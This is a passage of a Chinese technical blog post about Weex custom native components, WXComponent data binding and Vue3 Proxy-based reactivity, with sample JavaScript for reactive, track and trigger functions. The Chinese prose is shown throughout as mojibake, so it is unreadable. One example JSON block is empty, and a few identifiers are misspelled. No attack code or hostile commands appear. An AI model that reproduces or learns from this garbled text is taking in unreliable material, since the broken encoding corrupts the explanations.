<p>ç­”ï¼š<strong>è‡ªå®šä¹‰åŸç”Ÿç»„ä»¶å¿…é¡»ç»§æ‰¿è‡ª WXComponentï¼Œæœ¬è´¨æ˜¯å¤ç”¨ Weex å°è£…çš„ã€ŒJS - åŸç”Ÿäº¤äº’ã€ç”Ÿå‘½å‘¨æœŸã€æ ·å¼å¸ƒå±€ã€æ¸²æŸ“åŸºç¡€ã€ç­‰é€šç”¨èƒ½åŠ›ï¼Œç¡®ä¿ç»„ä»¶èƒ½æ¥å…¥ Weex è¿è¡Œæ—¶ç”Ÿæ€</strong>ã€‚</p>
<p>Weex Module ä¸ Componet çš„åŒºåˆ«</p>























<table><thead><tr><th>ç±»å‹</th><th>æ ¸å¿ƒä½œç”¨</th><th>åŸºç±»</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>Component</td><td>åŸç”Ÿ UI æ¸²æŸ“ï¼ˆæœ‰è§†å›¾ï¼‰</td><td><code>WXComponent</code></td><td><code>WXImageComponent</code>ï¼ˆå›¾ç‰‡ï¼‰ã€<code>WXTextComponent</code>ï¼ˆæ–‡æœ¬ï¼‰ã€è‡ªå®šä¹‰æŒ‰é’®ç»„ä»¶</td></tr><tr><td>Module</td><td>åŠŸèƒ½æ‰©å±•ï¼ˆæ— è§†å›¾ï¼‰</td><td><code>WXModule</code></td><td><code>WXNavigatorModule</code>ï¼ˆå¯¼èˆªï¼‰ã€<code>WXStorageModule</code>ï¼ˆå­˜å‚¨ï¼‰ã€è‡ªå®šä¹‰å·¥å…·æ¨¡å—</td></tr></tbody></table>
<p>å®ç° JS ä¸åŸç”Ÿç»„ä»¶çš„ã€Œæ•°æ®åŒæ­¥ã€ï¼ˆå±æ€§ã€äº‹ä»¶ã€æ–¹æ³•ï¼‰</p>
<p>Weex çš„æ ¸å¿ƒæ˜¯ã€ŒJS æ§åˆ¶åŸç”Ÿç»„ä»¶ã€ï¼Œè€Œ <code>WXComponent</code> å°è£…äº† JS ä¸åŸç”Ÿä¹‹é—´çš„é€šä¿¡åè®®ï¼Œæ— éœ€è‡ªå®šä¹‰ç»„ä»¶æ‰‹åŠ¨å¤„ç†ï¼š</p>
<ul>
<li>
<p>å±æ€§åŒæ­¥ï¼ˆPropsï¼‰ï¼šJS ç«¯é€šè¿‡ <code>&lt;my-component prop1="xxx" prop2="yyy"&gt;</code> ä¼ é€’çš„å±æ€§ï¼ŒWXComponent ä¼šè‡ªåŠ¨è§£æã€ç±»å‹è½¬æ¢ï¼ˆå¦‚ JS å­—ç¬¦ä¸² â†’ åŸç”Ÿ NSString/NSNumberï¼‰ï¼Œå¹¶é€šè¿‡ <code>setter</code> æ–¹æ³•åŒæ­¥åˆ°è‡ªå®šä¹‰ç»„ä»¶ã€‚</p>
<p>ç¤ºä¾‹ï¼šWXImageComponent ç»§æ‰¿ <code>WXComponent</code> åï¼Œåªéœ€é‡å†™ <code>-setSrc:(NSString*)src</code> æ–¹æ³•ï¼Œå°±èƒ½æ¥æ”¶ JS ä¼ çš„ <code>src</code> å±æ€§ï¼Œæ— éœ€å…³å¿ƒã€ŒJS å¦‚ä½•æŠŠå€¼ä¼ ç»™åŸç”Ÿã€ã€‚</p>
</li>
<li>
<p>äº‹ä»¶åˆ†å‘ï¼ˆEventsï¼‰ï¼šåŸç”Ÿç»„ä»¶çš„äº¤äº’äº‹ä»¶ï¼ˆå¦‚ç‚¹å‡»ã€åŠ è½½å®Œæˆï¼‰ï¼Œ<code>WXComponent</code> ä¼šæŒ‰ç…§ Weex åè®®å›ä¼ ç»™ JS ç«¯ï¼ˆå¦‚ <code>@emit('click')</code> )</p>
<p>ç¤ºä¾‹ï¼šè‡ªå®šä¹‰æŒ‰é’®ç»„ä»¶ç»§æ‰¿åï¼Œåªéœ€è°ƒç”¨ <code>[self fireEvent:@"click" params:@{@"x": @100, @"y": @200}]</code> ï¼ŒJS ç«¯å°±èƒ½é€šè¿‡ <code>@onclick</code>æ¥æ”¶äº‹ä»¶ï¼Œæ— éœ€è‡ªå·±å®ç°äº‹ä»¶é€šä¿¡ã€‚</p>
</li>
<li>
<p>æ–¹æ³•è°ƒç”¨ï¼ˆMethodsï¼‰ï¼šJS ç«¯é€šè¿‡ <code>this.$refs.myComponent.callMethod('xxx', params)</code> è°ƒç”¨åŸç”Ÿç»„ä»¶æ–¹æ³•ï¼Œ<code>WXComponent</code></p>
<p>ä¼šè§£ææ–¹æ³•åå’Œå‚æ•°ï¼Œåå°„è°ƒç”¨è‡ªå®šä¹‰ç»„ä»¶çš„å¯¹åº”æ–¹æ³•ã€‚</p>
<p>ç¤ºä¾‹ï¼šè‡ªå®šä¹‰æ’­æ”¾å™¨ç»„ä»¶ç»§æ‰¿åï¼Œåªéœ€æš´éœ² <code>-play</code>æ–¹æ³•ï¼ŒJS å°±èƒ½ç›´æ¥è°ƒç”¨ï¼Œ<code>WXComponent</code>è´Ÿè´£æ–¹æ³•æŸ¥æ‰¾å’Œå‚æ•°ä¼ é€’ã€‚</p>
</li>
</ul>
<h2 data-id="heading-15">äº”ã€JS æ•°æ®å˜åŒ–æ˜¯å¦‚ä½•é©±åŠ¨ Native UI æ›´æ–°çš„</h2>
<p>çº¯ Web ç«¯çš„æ•°æ®å˜åŒ–ä¼šé€šè¿‡ Proxy å»é©±åŠ¨å…³è”çš„ UI æ›´æ–°ï¼Œè¿™ä¹Ÿæ˜¯ Vue3 çš„å·¥ä½œåŸç†ï¼Œé‚£ä¹ˆ JS ç«¯çš„æ•°æ®å˜åŒ–æ˜¯å¦‚ä½•é©±åŠ¨ Native UI ç»„ä»¶çš„æ›´æ–°çš„ï¼Ÿ</p>
<p>æ‰€æœ‰çš„ Native UI Component éƒ½ç»§æ‰¿è‡ª WXComponentï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç»™ WXComponent æ·»åŠ ä¸€ä¸ªå®ç° DataBinding çš„ Categoryï¼Œè¿™å°±æ˜¯ Weex æœ€æ–°æºç ä¸­çš„ <code>WXComponent+DataBinding.mm</code></p>
<p>æ ¸å¿ƒæ˜¯ï¼š<strong>è§£æ JS ç«¯ä¼ é€’çš„ã€Œç»‘å®šè¡¨è¾¾å¼ã€ï¼ˆå¦‚ <code>{{a + b}}</code>ï¼‰ï¼Œç¼–è¯‘ä¸ºåŸç”Ÿå¯æ‰§è¡Œçš„å›è°ƒ Blockï¼Œå½“ JS æ•°æ®å˜åŒ–æ—¶ï¼Œé€šè¿‡ Block è®¡ç®—å‡ºç»„ä»¶æ‰€éœ€çš„æ–°å€¼ï¼Œè‡ªåŠ¨æ›´æ–°ç»„ä»¶çš„å±æ€§ã€æ ·å¼ã€äº‹ä»¶ï¼Œæˆ–å¤„ç†åˆ—è¡¨ï¼ˆ<code>v-for</code>ï¼‰ã€æ¡ä»¶ï¼ˆ<code>v-if</code>ï¼‰ã€ä¸€æ¬¡æ€§ç»‘å®šï¼ˆ<code>v-once</code>ï¼‰ç­‰é€»è¾‘</strong></p>
<p>å¯èƒ½æœ‰äº›äººè¦é—®äº†ï¼šä¸ºä»€ä¹ˆå½“ js æ•°æ®å˜åŒ–æ—¶ï¼Œéœ€è¦è®© Native è®¡ç®—ç»„ä»¶æ‰€éœ€çš„æ–°å€¼ï¼Ÿè¿™ä¸å°±æ˜¯ Native åšäº†ä¸€é Vue å“åº”å¼çš„é€»è¾‘å—ï¼Ÿè¿™ç§é‡å¤é€»è¾‘çš„ä»·å€¼æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p><strong>Vue3 çš„ Proxy åªè´Ÿè´£ã€ŒJS ç«¯æ•°æ®å˜åŒ–çš„ç›‘å¬ + ä¾èµ–æ”¶é›† + è§¦å‘æ›´æ–°é€šçŸ¥ã€â€”â€” å®ƒæ˜¯ â€œå“åº”å¼çš„è§¦å‘å™¨â€ï¼Œè€Œé â€œUI æ›´æ–°çš„æ‰§è¡Œè€…â€</strong></p>
<p>è€Œ Weex ä¹‹æ‰€ä»¥éœ€è¦ Native æ‰˜ç®¡ï¼Œæ ¸å¿ƒæ˜¯å› ä¸ºã€Œç»§æ‰¿è‡ª WXComponent çš„ UI ç»„ä»¶æ˜¯ Native ä¾§çš„åŸç”Ÿç»„ä»¶ï¼Œè€Œé DOM ç»„ä»¶ã€ï¼ŒJS ç«¯æ²¡æœ‰ä»»ä½•èƒ½åŠ›ï¼ˆAPIï¼‰å»è®¿é—®ã€æ“ä½œä»–ä»¬ï¼ŒProxy å†å¼ºå¤§ï¼Œå®ƒä¹Ÿåªæ˜¯ Native ä¾§ï¼ˆWeexï¼‰å’Œ Web ç«¯ï¼ˆVueï¼‰è´Ÿè´£â€œå–Šä¸€å£°ï¼Œå“ï¼Œæ•°æ®å˜äº†ï¼Œä½ ä»¬è°éœ€è¦çš„è‡ªåŠ©ï¼Œè‡ªå·±å»å¤„ç†æ„Ÿå…´è¶£çš„ UIâ€ï¼Œå´æ‘¸ä¸åˆ° UI ç»„ä»¶ï¼ŒWeb ç«¯ç”± DOM API å»æ¸²æŸ“ç»˜åˆ¶ï¼ŒNative ç«¯æ›´è§¦ç¢°ä¸åˆ°ï¼Œå¿…é¡»ç”± Native è‡ªå·±æ¥å®Œæˆï¼šå¬åˆ°é€šçŸ¥ -&gt; è®¡ç®—æ–°å€¼ -&gt; æ›´æ–°æ§ä»¶çš„æµç¨‹ã€‚</p>
<h3 data-id="heading-16">1. Proxy éƒ½åšäº†äº›ä»€ä¹ˆï¼Ÿ</h3>
<p>Vue3 çš„æ ¸å¿ƒå®ç°é‡Œ Proxy åšäº†3ä»¶äº‹ï¼šå…¨ç¨‹åœ¨ JS ä¾§ï¼Œä¸æ¶‰åŠä»»ä½• UI æ“ä½œ</p>
<p>ç›‘å¬æ•°æ®æ“ä½œï¼šé€šè¿‡ Proxy ä»£ç†å¯¹è±¡æ‹¦æˆªæ•°æ®çš„ getterã€setter</p>
<ul>
<li>é€šè¿‡ getter æ”¶é›†ä¾èµ–å…³ç³»ï¼šå½“ç»„ä»¶æ¸²æŸ“æ—¶è§¦å‘ getterï¼ŒProxy ä¼šè®°å½•è¿™ä¸ªç»„ä»¶ä¾èµ–äº†è¿™ä¸ªæ•°æ®</li>
<li>é€šè¿‡ setter è§¦å‘æ›´æ–°é€šçŸ¥ï¼šå½“æ•°æ®è¢«ä¿®æ”¹æ—¶è§¦å‘ setterï¼ŒProxy ä¼šå‘Šè¯‰ Vue è¿è¡Œæ—¶ï¼Œâ€œuser.nameâ€ å˜äº†ï¼Œæ‰€æœ‰ä¾èµ–å®ƒçš„ç»„ä»¶è¯¥æ›´æ–°äº†</li>
</ul>
<p>Proxyï¼ˆä»£ç†ï¼‰æ˜¯ ES6 æ–°å¢çš„å†…ç½®å¯¹è±¡ï¼Œç”¨äº<strong>åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„ä»£ç†å‰¯æœ¬</strong>ï¼Œå¹¶é€šè¿‡ã€Œé™·é˜±ï¼ˆTrapï¼‰ã€æ‹¦æˆªå¯¹åŸå¯¹è±¡çš„åŸºæœ¬æ“ä½œï¼ˆå¦‚å±æ€§è®¿é—®ã€èµ‹å€¼ã€åˆ é™¤ç­‰ï¼‰ï¼Œä»è€Œè‡ªå®šä¹‰è¿™äº›æ“ä½œçš„è¡Œä¸ºã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);
</code></pre>
<ul>
<li><code>target</code>ï¼šè¢«ä»£ç†çš„<strong>åŸå§‹å¯¹è±¡</strong>ï¼ˆå¯ä»¥æ˜¯å¯¹è±¡ã€æ•°ç»„ï¼Œç”šè‡³å‡½æ•°ï¼‰ï¼›</li>
<li><code>handler</code>ï¼šé…ç½®å¯¹è±¡ï¼ŒåŒ…å«å¤šä¸ªã€Œé™·é˜±æ–¹æ³•ã€ï¼ˆå¦‚ <code>get</code>ã€<code>set</code>ï¼‰ï¼Œç”¨äºå®šä¹‰æ‹¦æˆªé€»è¾‘ï¼›</li>
<li><code>proxy</code>ï¼šä»£ç†å¯¹è±¡ï¼Œåç»­å¯¹åŸå§‹å¯¹è±¡çš„æ“ä½œéœ€é€šè¿‡ä»£ç†å¯¹è±¡è¿›è¡Œï¼Œæ‰èƒ½è§¦å‘æ‹¦æˆªã€‚</li>
</ul>






























<table><thead><tr><th>é™·é˜±æ–¹æ³•</th><th>ä½œç”¨</th><th>è§¦å‘åœºæ™¯</th></tr></thead><tbody><tr><td><code>get(target, key, receiver)</code></td><td>æ‹¦æˆªã€Œå±æ€§è®¿é—®ã€</td><td><code>proxy.key</code> æˆ– <code>proxy[key]</code></td></tr><tr><td><code>set(target, key, value, receiver)</code></td><td>æ‹¦æˆªã€Œå±æ€§èµ‹å€¼ã€</td><td><code>proxy.key = value</code> æˆ– <code>proxy[key] = value</code></td></tr><tr><td><code>deleteProperty(target, key)</code></td><td>æ‹¦æˆªã€Œå±æ€§åˆ é™¤ã€</td><td><code>delete proxy.key</code></td></tr><tr><td><code>has(target, key)</code></td><td>æ‹¦æˆªã€Œ<code>in</code> è¿ç®—ç¬¦åˆ¤æ–­ã€</td><td><code>key in proxy</code></td></tr></tbody></table>
<p>Tips: Proxy ä»£ç†çš„æ˜¯ã€Œæ•´ä¸ªå¯¹è±¡ã€ï¼Œè€Œéå•ä¸ªå±æ€§ï¼Œä¸”æ‹¦æˆªçš„æ˜¯ã€Œæ“ä½œè¡Œä¸ºã€ï¼ˆå¦‚ â€œè®¿é—®å±æ€§â€ è¿™ä¸ªåŠ¨ä½œï¼‰ï¼Œè€Œéå±æ€§æœ¬èº«ã€‚</p>
<p>Vue æ ¸å¿ƒæµç¨‹ï¼š<strong>åˆ›å»ºä»£ç† â†’ ä¾èµ–æ”¶é›† â†’ æ•°æ®ä¿®æ”¹ â†’ è§¦å‘æ›´æ–°</strong>ã€‚</p>
<h4 data-id="heading-17">1. åˆ›å»ºä»£ç†ï¼ˆreactive å‡½æ•°çš„æ ¸å¿ƒï¼‰</h4>
<p><code>reactive</code> å‡½æ•°æ¥æ”¶ä¸€ä¸ªåŸå§‹å¯¹è±¡ï¼Œè¿”å›å…¶ Proxy ä»£ç†å¯¹è±¡ï¼ŒåŒæ—¶é…ç½® <code>get</code>ã€<code>set</code> ç­‰é™·é˜±æ–¹æ³•ï¼Œä¸ºåç»­ä¾èµ–æ”¶é›†å’Œæ›´æ–°åšå‡†å¤‡</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">reactive</span>(<span class="hljs-params">target</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, {
    <span class="hljs-comment">// æ‹¦æˆªå±æ€§è®¿é—®</span>
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key, receiver</span>) {
      <span class="hljs-comment">// 1. å…ˆè·å–åŸå§‹å±æ€§å€¼</span>
      <span class="hljs-keyword">const</span> value = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
      <span class="hljs-comment">// 2. æ”¶é›†ä¾èµ–ï¼ˆå…³é”®ï¼šè®°å½•â€œè°åœ¨è®¿é—®è¿™ä¸ªå±æ€§â€ï¼‰</span>
      <span class="hljs-title function_">track</span>(target, key);
      <span class="hljs-comment">// 3. è‹¥è®¿é—®çš„æ˜¯åµŒå¥—å¯¹è±¡ï¼Œé€’å½’åˆ›å»ºä»£ç†ï¼ˆæ‡’ä»£ç†ï¼Œä¼˜åŒ–æ€§èƒ½ï¼‰</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">'object'</span> &amp;&amp; value !== <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">reactive</span>(value);
      }
      <span class="hljs-keyword">return</span> value;
    },
    <span class="hljs-comment">// æ‹¦æˆªå±æ€§èµ‹å€¼</span>
    <span class="hljs-title function_">set</span>(<span class="hljs-params">target, key, value, receiver</span>) {
      <span class="hljs-comment">// 1. å…ˆè®¾ç½®åŸå§‹å±æ€§å€¼</span>
      <span class="hljs-keyword">const</span> oldValue = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, key, receiver);
      <span class="hljs-keyword">const</span> success = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, key, value, receiver);
      <span class="hljs-comment">// 2. è‹¥å€¼å‘ç”Ÿå˜åŒ–ï¼Œè§¦å‘ä¾èµ–æ›´æ–°</span>
      <span class="hljs-keyword">if</span> (success &amp;&amp; oldValue !== value) {
        <span class="hljs-title function_">trigger</span>(target, key);
      }
      <span class="hljs-keyword">return</span> success;
    },
    <span class="hljs-comment">// æ‹¦æˆªå±æ€§åˆ é™¤</span>
    <span class="hljs-title function_">deleteProperty</span>(<span class="hljs-params">target, key</span>) {
      <span class="hljs-keyword">const</span> success = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(target, key);
      <span class="hljs-keyword">if</span> (success) {
        <span class="hljs-title function_">trigger</span>(target, key); <span class="hljs-comment">// åˆ é™¤å±æ€§ä¹Ÿè§¦å‘æ›´æ–°</span>
      }
      <span class="hljs-keyword">return</span> success;
    }
  });
}
</code></pre>
<ul>
<li>ç”¨ <code>Reflect</code> æ“ä½œåŸå§‹å¯¹è±¡ï¼ŒReflect æ˜¯ ES6 æ–°å¢çš„å†…ç½®å¯¹è±¡ï¼Œæä¾›äº†ä¸ Proxy é™·é˜±å¯¹åº”çš„æ–¹æ³•ï¼Œæ¯”å¦‚ <code>Relect.get</code>ã€<code>Reflect.set</code> ç¡®ä¿æ“ä½œåŸå§‹å¯¹è±¡çš„è¡Œä¸ºä¸€ç›´ï¼ŒåŒæ—¶é¿å…ç›´æ¥æ“ä½œ target æ‰€äº§ç”Ÿçš„é—®é¢˜</li>
<li>åµŒå¥—å¯¹è±¡æ‡’ä»£ç†ï¼šProxy ä»…ä»£ç†å½“å‰å±‚çº§å¯¹è±¡ï¼Œå½“è®¿é—®åµŒå¥—å¯¹è±¡ ï¼ˆproxy.user.nameï¼‰æ—¶ï¼Œæ‰é€’å½’å¯¹ user å¯¹è±¡åˆ›å»ºä»£ç†ï¼Œé¿å…åˆå§‹åŒ–æ—¶é€’å½’éå†æ‰€æœ‰å±æ€§ï¼Œä¼˜åŒ–æ€§èƒ½</li>
</ul>
<h4 data-id="heading-18">2. ä¾èµ–æ”¶é›†</h4>
<p>Vue3 ç”¨ã€Œä¸‰å±‚æ˜ å°„ã€å­˜å‚¨ä¾èµ–ï¼Œç¡®ä¿ç²¾å‡†å®šä½</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// WeakMapï¼škey æ˜¯è¢«ä»£ç†çš„åŸå§‹å¯¹è±¡ï¼ˆtargetï¼‰ï¼Œvalue æ˜¯è¯¥å¯¹è±¡çš„å±æ€§-ä¾èµ–æ˜ å°„</span>
<span class="hljs-keyword">const</span> targetMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();

<span class="hljs-keyword">function</span> <span class="hljs-title function_">track</span>(<span class="hljs-params">target, key</span>) {
  <span class="hljs-comment">// 1. è‹¥æ²¡æœ‰å½“å‰ç›®æ ‡å¯¹è±¡çš„æ˜ å°„ï¼Œåˆ›å»ºä¸€ä¸ªï¼ˆMapï¼škey æ˜¯å±æ€§åï¼Œvalue æ˜¯ä¾èµ–é›†åˆï¼‰</span>
  <span class="hljs-keyword">if</span> (!targetMap.<span class="hljs-title function_">has</span>(target)) {
    targetMap.<span class="hljs-title function_">set</span>(target, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());
  }
  <span class="hljs-keyword">const</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target);

  <span class="hljs-comment">// 2. è‹¥æ²¡æœ‰å½“å‰å±æ€§çš„ä¾èµ–é›†åˆï¼Œåˆ›å»ºä¸€ä¸ªï¼ˆSetï¼šå­˜å‚¨ä¾èµ–å‡½æ•°ï¼Œå»é‡ï¼‰</span>
  <span class="hljs-keyword">if</span> (!depsMap.<span class="hljs-title function_">has</span>(key)) {
    depsMap.<span class="hljs-title function_">set</span>(key, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());
  }
  <span class="hljs-keyword">const</span> deps = depsMap.<span class="hljs-title function_">get</span>(key);

  <span class="hljs-comment">// 3. å°†å½“å‰æ´»è·ƒçš„ä¾èµ–å‡½æ•°ï¼ˆeffectï¼‰æ·»åŠ åˆ°é›†åˆä¸­</span>
  <span class="hljs-keyword">if</span> (activeEffect) {
    deps.<span class="hljs-title function_">add</span>(activeEffect);
  }
}
</code></pre>
<p>ä¼šäº§ç”Ÿä¸€ä¸ªè¿™æ ·çš„ç»“æ„</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
	<span class="hljs-string">""</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-19">3. æ•°æ®ä¿®æ”¹ï¼ˆè§¦å‘ set/deleteProperty çš„é™·é˜±ï¼‰</h4>
<p>å½“é€šè¿‡ä»£ç†å¯¹è±¡ä¿®æ”¹å±æ€§ï¼ˆå¦‚ <code>proxy.name = 'newName'</code>ï¼‰æˆ–åˆ é™¤å±æ€§ï¼ˆå¦‚ <code>delete proxy.age</code>ï¼‰æ—¶ï¼Œä¼šè§¦å‘å¯¹åº”çš„ Proxy é™·é˜±ï¼ˆ<code>set</code> æˆ– <code>deleteProperty</code>ï¼‰ã€‚</p>
<p>é™·é˜±å‡½æ•°ä¼šå…ˆæ›´æ–°åŸå§‹å¯¹è±¡çš„å±æ€§å€¼ï¼Œå†åˆ¤æ–­å€¼æ˜¯å¦çœŸçš„å‘ç”Ÿå˜åŒ–ï¼ˆé¿å…æ— æ•ˆæ›´æ–°ï¼‰</p>
<h4 data-id="heading-20">4. è§¦å‘æ›´æ–° ï¼ˆtigger å‡½æ•°ï¼‰</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">trigger</span>(<span class="hljs-params">target, key</span>) {
  <span class="hljs-comment">// 1. ä» targetMap ä¸­è·å–å½“å‰å¯¹è±¡çš„å±æ€§-ä¾èµ–æ˜ å°„</span>
  <span class="hljs-keyword">const</span> depsMap = targetMap.<span class="hljs-title function_">get</span>(target);
  <span class="hljs-keyword">if</span> (!depsMap) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 2. è·å–å½“å‰å±æ€§çš„æ‰€æœ‰ä¾èµ–</span>
  <span class="hljs-keyword">const</span> deps = depsMap.<span class="hljs-title function_">get</span>(key);
  <span class="hljs-keyword">if</span> (!deps) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 3. æ‰§è¡Œæ‰€æœ‰ä¾èµ–å‡½æ•°ï¼ˆè§¦å‘æ›´æ–°ï¼‰</span>
  deps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">effect</span> =&gt;</span> <span class="hljs-title function_">effect</span>());
}
</code></pre>
<h3 data-id="heading-21">2. Proxy ä¸åšçš„äº‹æƒ…</h3>
<ul>
<li>ä¸è®¡ç®—è¡¨è¾¾å¼ï¼ˆæ¯”å¦‚ user.name + "åç¼€"çš„ç»“æœï¼ŒProxy ä¸ç®¡ï¼‰</li>
<li>ä¸æ“ä½œ UIï¼ˆä¸ç®¡æ˜¯ DOM å’Œ Native æ§ä»¶ï¼ŒProxy éƒ½ä¸ç¢°ï¼‰</li>
<li>ä¸è·¨ç«¯é€šä¿¡</li>
</ul>
<p>ä¸ºä»€ä¹ˆ Native ç»„ä»¶ä¸èƒ½è®© Proxy â€œè§£å†³â€ï¼Ÿ</p>
<p>æ ¸å¿ƒçŸ›ç›¾ï¼šæ¸²æŸ“è½½ä½“ä¸åŒã€‚Proxy ä¹‹æ‰€ä»¥åœ¨ Web ç«¯èƒ½ â€œé—´æ¥é©±åŠ¨ UIâ€ï¼Œæ˜¯å› ä¸º Web ç«¯æœ‰ä¸ªã€Œä¸­é—´æ¡¥æ¢ã€â€”â€” DOMï¼Œä¸” JS ç«¯æœ‰å®Œæ•´çš„ DOM APIï¼ˆæ¯”å¦‚ <code>document.getElementById</code>ã€<code>element.style.setProperty</code>ï¼‰ï¼š</p>
<p>Web ç«¯å®Œæ•´é“¾è·¯ï¼šProxy è§¦å‘æ›´æ–° â†’ Vue è¿è¡Œæ—¶è®¡ç®—è¡¨è¾¾å¼ â†’ è™šæ‹Ÿ DOM diff â†’ è°ƒç”¨ DOM API æ“ä½œ DOM â†’ UI æ›´æ–°</p>
<ul>
<li><strong>JS ç«¯æ²¡æœ‰æ“ä½œ Native æ§ä»¶çš„ API</strong>ï¼šæµè§ˆå™¨ç»™ JS æš´éœ²äº† DOM APIï¼Œä½† iOS/Android ç³»ç»Ÿä¸ä¼šç»™ JS å¼•æ“æš´éœ² â€œä¿®æ”¹ <code>UILabel</code> æ–‡æœ¬â€â€œè®¾ç½® <code>UIImageView</code> å›¾ç‰‡â€ çš„ API â€”â€” JS ç«¯è¿ Native æ§ä»¶çš„ â€œå¼•ç”¨â€ éƒ½æ‹¿ä¸åˆ°ï¼Œæ›´åˆ«è¯´æ›´æ–°äº†ï¼›</li>
<li><strong>Native æ§ä»¶ä¸åœ¨ JS è¿è¡Œæ—¶çš„å†…å­˜ç©ºé—´</strong>ï¼šJS å¼•æ“ï¼ˆå¦‚ V8ã€JSCï¼‰å’Œ Native åº”ç”¨æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ â€œè¿›ç¨‹ / è™šæ‹Ÿæœºâ€ï¼Œå†…å­˜ä¸å…±äº« â€”â€” Proxy æ‰€åœ¨çš„ JS å†…å­˜é‡Œï¼Œæ ¹æœ¬æ²¡æœ‰ Native æ§ä»¶çš„å®ä¾‹ï¼Œæƒ³æ“ä½œéƒ½æ— ä»ä¸‹æ‰‹</li>
</ul>
<p>Weex çš„è®¾è®¡ä¼˜é›…ä¹‹å¤„åœ¨äºï¼šNative æ‰˜ç®¡â€œæ‰§è¡Œå±‚â€ï¼ŒProxy ä¿ç•™â€œè§¦å‘å±‚â€ã€‚å“åº”å¼å·¥ä½œç»§ç»­å¤ç”¨ç°æœ‰é€»è¾‘ï¼Œç”± Proxy å®Œæˆï¼Œæœ€åçš„æ‰§è¡Œå±‚ç”± Native å®ç°ï¼Œä¹Ÿå°±æ˜¯ WXComponent+DataBinding</p>
<ul>
<li><strong>å“åº”å¼ç³»ç»Ÿï¼ˆProxyï¼‰çš„æ ¸å¿ƒæ˜¯ â€œå‘ç°å˜åŒ–â€</strong>ï¼šä¸ç®¡æ˜¯ Web è¿˜æ˜¯ Weexï¼ŒProxy éƒ½åªå¹²è¿™ä»¶äº‹ï¼›</li>
<li><strong>UI æ›´æ–°çš„æ ¸å¿ƒæ˜¯ â€œæ“ä½œæ¸²æŸ“è½½ä½“â€</strong>ï¼šWeb ç«¯æ“ä½œ DOMï¼ˆJS ç«¯èƒ½åšï¼‰ï¼ŒWeex ç«¯æ“ä½œ Native æ§ä»¶ï¼ˆåªèƒ½ Native ç«¯åšï¼‰ï¼›</li>
<li><strong>WXComponent+DataBinding çš„è§’è‰²æ˜¯ â€œNative ç«¯çš„ UI æ‰§è¡Œå™¨â€</strong>ï¼šå®ƒä¸æ˜¯æ›¿ä»£ Proxyï¼Œè€Œæ˜¯ Proxy è§¦å‘æ›´æ–°åï¼Œè´Ÿè´£æŠŠ â€œæ›´æ–°é€šçŸ¥â€ è½åœ°åˆ° Native æ§ä»¶ä¸Šçš„å”¯ä¸€é€”å¾„</li>
</ul>
<h2 data-id="heading-22">å…­ã€Weex è‡ªå®šä¹‰ç»„ä»¶æ˜¯å¦‚ä½•å·¥ä½œçš„</h2>
<p>ä¸Šé¢åˆ†æäº†è‡ªå®šä¹‰ç»„ä»¶çš„æ•°æ®å˜åŒ–å’Œè¡¨è¾¾å¼è¿ç®—æ˜¯ Native è´Ÿè´£çš„ï¼Œæ‰§è¡Œå±‚ä¹Ÿå°±æ˜¯ <code>WXComponent+DataBinding.mm</code> è¿™ä¸ªç±»ã€‚</p>
<p>ä¸€è¨€ä»¥è”½ä¹‹å°±æ˜¯ï¼šæŠŠ JS ç«¯ä¼ é€’çš„â€œåŸå§‹æ•°æ®â€ï¼Œé€šè¿‡é¢„ç¼–è¯‘çš„ç»‘å®šè§„åˆ™ï¼ˆBlockï¼‰è®¡ç®—å‡º Native ç»„ä»¶éœ€è¦çš„æœ€ç»ˆå€¼ï¼Œå¹¶è‡ªåŠ¨æ›´æ–° UI ç»„ä»¶ï¼ŒåŒæ—¶é€‚é…é•¿åˆ—è¡¨ç»„ä»¶ç­‰å¤æ‚åœºæ™¯çš„ UI ä¼˜åŒ–ã€‚</p>
<p>è¯¥åˆ†ç±»ä¸ºæ‰€æœ‰ç»§æ‰¿è‡ª WXComponent çš„ç»„ä»¶ï¼Œæ³¨å…¥â€œæ•°æ®ç»‘å®šèƒ½åŠ›â€ï¼Œæ— éœ€æ‰‹åŠ¨å®ç°ã€‚</p>
<h3 data-id="heading-23">1. ç»‘å®šè§„åˆ™çš„â€œç¼–è¯‘å­˜å‚¨â€ï¼ŒæŠŠ JS è¡¨è¾¾å¼è½¬æ¢ä¸º Native å¯æ‰§è¡Œçš„ block</h3>
